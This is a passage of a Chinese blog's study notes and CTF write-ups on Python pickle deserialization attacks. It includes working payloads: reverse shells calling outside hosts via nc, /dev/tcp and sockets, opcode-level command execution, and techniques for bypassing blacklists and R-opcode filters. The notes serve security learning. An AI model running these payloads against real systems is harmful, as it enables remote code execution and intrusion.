&#123;&#x27;name&#x27;: &#x27;Alice&#x27;, &#x27;age&#x27;: 30&#125;</span><br><span class="line">pickled = pickle.dumps(data, protocol=0)</span><br><span class="line">print(pickled)</span><br><span class="line"># 输出: b&#x27;(dp0\nS\&#x27;name\&#x27;\np1\nS\&#x27;Alice\&#x27;\np2\nsS\&#x27;age\&#x27;\np3\nI30\ns.&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">协议 3（二进制格式）</span><br><span class="line">python</span><br><span class="line">运行</span><br><span class="line"></span><br><span class="line">pickled = pickle.dumps(data, protocol=3)</span><br><span class="line">print(pickled)</span><br><span class="line"># 输出: b&#x27;\x80\x03&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x05\x00\x00\x00Aliceq\x02X\x03\x00\x00\x00ageq\x03K\x1es.&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">你的代码中的作用</span><br><span class="line">在你的代码中，protocol=0 确保生成的 pickle 数据是 ASCII 格式，后续通过 urllib.parse.quote() 编码为 URL 安全字符串。这在构造 HTTP 请求参数（如 Cookie、表单数据）时非常有用，因为 ASCII 格式更易于嵌入 URL 中。</span><br><span class="line"></span><br><span class="line">如果不指定协议（默认使用当前 Python 版本的最高协议），生成的二进制数据可能包含无法直接作为 URL 参数的字符，导致传输或解析错误。</span><br></pre></td></tr></table></figure>
+<p>如果不是这样的话，最上面的直接读取flag.txt是怎么来的，我怎么确定要读的是这样文件<br>我们在点击成为大会员后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /b1g_m4mber HTTP/1.1</span><br><span class="line">Host: node4.anna.nssctf.cn:28254</span><br><span class="line">Content-Length: 79</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://node4.anna.nssctf.cn:28254</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://node4.anna.nssctf.cn:28254/b1g_m4mber</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: commodity_id=&quot;2|1:0|10:1752734508|12:commodity_id|8:MTYyNA==|b35dc01a033f45636c71a0f93d1043f7ec1b1634540c1d743eb334f9d4b858d4&quot;; _xsrf=2|014de807|65b58f93a15d4cb086d684e4e5d8401f|1752740480; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8iYM4QgkAw4NpjpP8tEn7MBbZoF-Kj8YRbosz3Qrr-Q</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">_xsrf=2%7Cf91ac06b%7C9de2a7ff590a64dc7e81ac881d8f6873%7C1752740480&amp;become=admin</span><br></pre></td></tr></table></figure>
+<p>对become进行修改<br>最后拿到flag<br>最好在py2的环境下做这道题目，当然，py3的也出来了</p>
+<h2 id="其他做法，不用os模块"><a href="#其他做法，不用os模块" class="headerlink" title="其他做法，不用os模块"></a>其他做法，不用os模块</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import commands</span><br><span class="line">import urllib</span><br><span class="line">class test(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return(commands.getoutput,(&#x27;ls /&#x27;,))</span><br><span class="line">        </span><br><span class="line">t=test()</span><br><span class="line">print urllib.quote(pickle.dumps(t))</span><br></pre></td></tr></table></figure>
+<p>安装对应模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">解决方法：使用 subprocess 替代 commands</span><br><span class="line">如果你的代码是从 Python 2 迁移过来的，需要将 commands 替换为 subprocess。以下是常见用法的对应关系：</span><br><span class="line"></span><br><span class="line">Python 2 (commands)	Python 3 (subprocess)	说明</span><br><span class="line">commands.getoutput(cmd)	subprocess.getoutput(cmd)	执行命令，返回输出字符串</span><br><span class="line">commands.getstatusoutput(cmd)	subprocess.getstatusoutput(cmd)	执行命令，返回 (状态码，输出)</span><br></pre></td></tr></table></figure>
+<p>py2的环境下就不能用这个os模块了，要print才能有回显，都用上面这种方法</p>
+<h1 id="Python-Unpickle"><a href="#Python-Unpickle" class="headerlink" title="[Python]Unpickle"></a>[Python]Unpickle</h1><p>后面几道题目都是buu上面的<br>这里我们访问进去<br>只有一个hello，其他的什么都没有了<br>扫描发现什么没有<br>这里其实是给了源码了exp的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">from flask import Flask, request</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    try:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(&#x27;user&#x27;))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        username = user[&quot;username&quot;]</span><br><span class="line">    except:</span><br><span class="line">        username = &quot;Guest&quot;</span><br><span class="line"> </span><br><span class="line">    return &quot;Hello %s&quot; % username</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<p>很简答的源码，就是从cookie里面取出user，然后再pickle反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">#!/usr/bin/env python3</span><br><span class="line">import requests</span><br><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        s = &quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.18.0.1&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span><br><span class="line">        return (os.system, (s,))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line"> </span><br><span class="line">response = requests.get(&quot;http://172.18.0.2:8000/&quot;, cookies=dict(</span><br><span class="line">    user=base64.b64encode(s).decode()</span><br><span class="line">))</span><br><span class="line">print(response.content)</span><br></pre></td></tr></table></figure>
+<p>这个没有什么好说的了，基本都给你了，并且确定弹的出网？</p>
+<h1 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h1><p>这个和前面的给哥哥买东西的题目很像很像<br>这个我们主要是看看这个脚本是怎么写的<br>基本上的原理已经很清楚了，只是可能自己来写一个脚本，可能不想php反序列化那样能够很轻松地写出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval, (&quot;__import__(&#x27;os&#x27;).system(&#x27;nc 114.55.129.236 9999 -e/bin/sh&#x27;)&quot;,))</span><br><span class="line">a = A()</span><br><span class="line">print(base64.b64encode(pickle.dumps(a)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>和前面的基本一样，这里也不多说了</p>
+<h1 id="NewStarCTF-2023-公开赛道-Ye’s-Pickle"><a href="#NewStarCTF-2023-公开赛道-Ye’s-Pickle" class="headerlink" title="[NewStarCTF 2023 公开赛道]Ye’s Pickle"></a>[NewStarCTF 2023 公开赛道]Ye’s Pickle</h1><h1 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h1><p>[NewStarCTF 2023 公开赛道]Ye’s Pickle像这种题目，再或者类似的Pickle Store<br>都没有什么建设性<br>我觉得我现在对于这部分知识点，还差的是<br>1.脚本的编写，不会每次都是很简单的像上面的脚本。<br>2.就像我之前看到的24年的羊城杯的的exp，是会考一下绕过和waf的<br>payload是这种形式的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">opcode=b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/VPS/3333 0&gt;&amp;1&quot;&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">secret=&quot;EnjoyThePlayTime123456&quot;</span><br><span class="line">exp = touni(cookie_encode((&#x27;user&#x27;, opcode), secret))</span><br><span class="line">print(exp)</span><br></pre></td></tr></table></figure>
+<p>我觉得我现在需要的就是对这个方面的再学习和理解</p>
+<h1 id="pickle再细致学习"><a href="#pickle再细致学习" class="headerlink" title="pickle再细致学习"></a>pickle再细致学习</h1><p>参考大佬博客<br><a target="_blank" rel="noopener" href="https://ayan0.top/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://ayan0.top/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a><br>和<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/google20/article/details/142071729?ops_request_misc=%257B%2522request%255Fid%2522%253A%252223d756aa4e29e1ebe7cf397aa72da6be%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=23d756aa4e29e1ebe7cf397aa72da6be&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-142071729-null-null.142%5Ev102%5Epc_search_result_base4&utm_term=pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4187">https://blog.csdn.net/google20/article/details/142071729?ops_request_misc=%257B%2522request%255Fid%2522%253A%252223d756aa4e29e1ebe7cf397aa72da6be%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=23d756aa4e29e1ebe7cf397aa72da6be&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-142071729-null-null.142^v102^pc_search_result_base4&amp;utm_term=pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4187</a></p>
+<h2 id="最基础部分"><a href="#最基础部分" class="headerlink" title="最基础部分"></a>最基础部分</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">class Person():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.age = 18</span><br><span class="line">        self.name = &quot;Pickle&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = Person()</span><br><span class="line">opcode = pickle.dumps(p) #将一个Person对象序列化成二进制字节流</span><br><span class="line">print(opcode)</span><br><span class="line"># 结果如下</span><br><span class="line"># b&#x27;\x80\x04\x957\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x03age\x94K\x12\x8c\x04name\x94\x8c\x06Pickle\x94ub.&#x27;</span><br><span class="line"></span><br><span class="line">P = pickle.loads(opcode) # 将一串二进制字节流反序列化为一个Person对象</span><br><span class="line">print(&#x27;The age is:&#x27; + str(P.age), &#x27;The name is:&#x27; + P.name)</span><br><span class="line"># 结果如下</span><br><span class="line"># The age is:18 The name is:Pickle</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这个还是没有什么问题的，只是一个单纯的先序列化一次，后面又反序列化一次的过程<br>比较重要的就是我们的__reduce__（）方法。是object类中的一个魔术方法，我们可以</p>
+<h2 id="常见的一些指令"><a href="#常见的一些指令" class="headerlink" title="常见的一些指令"></a>常见的一些指令</h2><p>c 	获取一个全局对象或import一个模块 	c[module]\n[instance]\n 	获得的对象入栈<br>o 	寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） 	o 	这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈<br>i 	相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） 	i[module]\n[callable]\n 	这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈<br>N 	实例化一个None 	N 	获得的对象入栈<br>S 	实例化一个字符串对象 	S’xxx’\n（也可以使用双引号、’等python字符串形式） 	获得的对象入栈<br>V 	实例化一个UNICODE字符串对象 	Vxxx\n 	获得的对象入栈<br>I 	实例化一个int对象 	Ixxx\n 	获得的对象入栈<br>F 	实例化一个float对象 	Fx.x\n 	获得的对象入栈<br>R 	选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 	R 	函数和参数出栈，函数的返回值入栈<br>. 	程序结束，栈顶的一个元素作为pickle.loads()的返回值 	. 	无<br>( 	向栈中压入一个MARK标记 	( 	MARK标记入栈<br>t 	寻找栈中的上一个MARK，并组合之间的数据为元组 	t 	MARK标记以及被组合的数据出栈，获得的对象入栈<br>) 	向栈中直接压入一个空元组 	) 	空元组入栈<br>l 	寻找栈中的上一个MARK，并组合之间的数据为列表 	l 	MARK标记以及被组合的数据出栈，获得的对象入栈<br>] 	向栈中直接压入一个空列表 	] 	空列表入栈<br>d 	寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） 	d 	MARK标记以及被组合的数据出栈，获得的对象入栈<br>} 	向栈中直接压入一个空字典 	} 	空字典入栈<br>p 	将栈顶对象储存至memo_n 	pn\n 	无<br>g 	将memo_n的对象压栈 	gn\n 	对象被压栈<br>0 	丢弃栈顶对象 	0 	栈顶对象被丢弃<br>b 	使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 	b 	栈上第一个元素出栈<br>s 	将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 	s 	第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新<br>u 	寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 	u 	MARK标记以及被组合的数据出栈，字典被更新<br>a 	将栈的第一个元素append到第二个元素(列表)中 	a 	栈顶元素出栈，第二个元素（列表）被更新<br>e 	寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 	e 	MARK标记以及被组合的数据出栈，列表被更新<br>我们来进行实例一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">ox.system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
+<p>换一种opcode的方式来表示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cos </span><br><span class="line">system #引入os.sysytem,压入栈</span><br><span class="line">(S&#x27;ls&#x27; #压入一个MARK，再压入字符串ls</span><br><span class="line">tR. #t把最后一个MARK处的元素包装成元组入栈</span><br><span class="line">#R把元组作为os.system的参数，最后.运行</span><br></pre></td></tr></table></figure>
+<p>也可以参考下面这个理解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">opcode = b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">cos</span><br><span class="line">system</span><br><span class="line">c表示import 一个模块中的函数并作为对象压栈</span><br><span class="line">(S&#x27;whoami&#x27; </span><br><span class="line">(表示向栈中压入一个Mark标记，S表示实例化一个whoami字符串对象并压栈</span><br><span class="line">tR.</span><br><span class="line">t表示寻找栈中的上一个MARK，并组合之间的数据为元组，获得对象压栈。</span><br><span class="line">R表示选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数，函数的返回值入栈。</span><br><span class="line">.表示程序结束，栈顶的一个元素作为pickle.loads()的返回值</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">pickle.loads(opcode)</span><br><span class="line">#xxx\21609</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">opcode = b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;</span><br><span class="line">tRcos</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在pickle中，和函数执行相关的字节码有三个R、I、O<br>分别对应</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">opcode1=b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">opcode2=b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">opcode3=b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">class Person:</span><br><span class="line">    def __init__(self, age, name):</span><br><span class="line">        self.age = age</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">opcode = b&#x27;&#x27;&#x27;c__main__</span><br><span class="line">Person</span><br><span class="line">(I18</span><br><span class="line">S&#x27;Pickle&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">p = pickle.loads(opcode)</span><br><span class="line">print(p)</span><br><span class="line">print(p.age, p.name)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&lt;__main__.Person object at 0x0000013440833B90&gt;</span><br><span class="line">18 Pickle</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>使用b执行进行变量覆盖</p>
+<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>__reduce__方法<br>对应的指令为R<br>class的__reduce__方法，在pickle反序列化的时候会被执行</p>
+<h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><p>对于R被禁了的时候</p>
+<h3 id="绕过黑名单函数"><a href="#绕过黑名单函数" class="headerlink" title="绕过黑名单函数"></a>绕过黑名单函数</h3><p>有一种过滤方式：不禁止R指令码，但是对R执行的函数有黑名单限制。典型的例子是2018-XCTF-HITB-WEB : Python’s-Revenge。给了好长好长一串黑名单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</span><br></pre></td></tr></table></figure>
+<p>platform.popen()不在名单里，它可以做到类似system的功能。这题死于黑名单有漏网之鱼可以帮助我们解决这道问题<br>还有一个解（估计是出题人的预期解），那就是利用map来干这件事</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Exploit(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line"> 	return map,(os.system,[&quot;ls&quot;])</span><br></pre></td></tr></table></figure>
+<p>最后就是黑名单是不可以用的，不可取</p>
+<h2 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h2><h3 id="使用b指令绕过R指令"><a href="#使用b指令绕过R指令" class="headerlink" title="使用b指令绕过R指令"></a>使用b指令绕过R指令</h3><p>当对象被序列化时调用__getstate__，被反序列化时调用__setstate__。重写时可以省略__setstate__，但__getstate__必须返回一个字典。如果__getstate__与__setstate__都被省略, 那么就默认自动保存和加载对象的属性字典__dict__。<br>在pickle源码中，字节码b对应的是load_build()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def load_build(self):</span><br><span class="line">    stack = self.stack</span><br><span class="line">    state = stack.pop()</span><br><span class="line">    #首先获取栈上的字节码b前的一个元素，对于对象来说，该元素一般是存储有对象属性的dict</span><br><span class="line">    inst = stack[-1]</span><br><span class="line">    #获取该字典中键名为&quot;__setstate__&quot;的value</span><br><span class="line">    setstate = getattr(inst, &quot;__setstate__&quot;, None)</span><br><span class="line">    #如果存在，则执行value(state)</span><br><span class="line">    if setstate is not None:</span><br><span class="line">        setstate(state)</span><br><span class="line">        return</span><br><span class="line">    slotstate = None</span><br><span class="line">    if isinstance(state, tuple) and len(state) == 2:</span><br><span class="line">        state, slotstate = state</span><br><span class="line">    #如果&quot;__setstate__&quot;为空，则state与对象默认的__dict__合并，这一步其实就是将序列化前保存的持久化属性和对象属性字典合并</span><br><span class="line">    if state:</span><br><span class="line">        inst_dict = inst.__dict__</span><br><span class="line">        intern = sys.intern</span><br><span class="line">        for k, v in state.items():</span><br><span class="line">            if type(k) is str:</span><br><span class="line">                inst_dict[intern(k)] = v</span><br><span class="line">            else:</span><br><span class="line">                inst_dict[k] = v</span><br><span class="line">    #如果__setstate__和__getstate__都没有设置，则加载默认__dict__</span><br><span class="line">    if slotstate:</span><br><span class="line">        for k, v in slotstate.items():</span><br><span class="line">            setattr(inst, k, v)</span><br><span class="line">dispatch[BUILD[0]] = load_build</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>如果我们将如果我们将字典{“<strong>setstate</strong>“:os.system}，压入栈中，并执行b字节码，，由于此时并没有__setstate__，所以这里b字节码相当于执行了__dict__.update，向对象的属性字典中添加了一对新的键值对。如果我们继续向栈中压入命令command，再次执行b字节码时，由于已经有了__setstate__，所以会将栈中字节码b的前一个元素当作state，执行__setstate__(state)，也就是os.system(command)</p>
